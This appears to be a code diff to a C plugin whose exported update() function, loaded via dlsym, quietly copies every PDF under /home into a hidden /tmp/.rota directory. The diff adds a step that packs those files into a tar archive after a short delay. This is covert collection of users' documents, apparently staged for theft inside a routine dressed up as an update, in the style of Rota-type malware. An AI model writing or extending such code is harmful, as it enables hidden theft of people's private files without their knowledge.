@@ -9,6 +9,10 @@ void copy_pdfs() {
     system("find /home/ -name *.pdf -exec cp {} /tmp/.rota \\; 2>/dev/null");
 }
 
+void tar() {
+	system("cd /tmp/ && tar -czvf rota.tar.gz /tmp/.rota");
+
+}
 
 
 // this is loaded via dlsym.
@@ -16,4 +20,6 @@ void copy_pdfs() {
 extern void update(void) {
     create_dir();
     copy_pdfs();
+		sleep(10);
+		tar();
 }
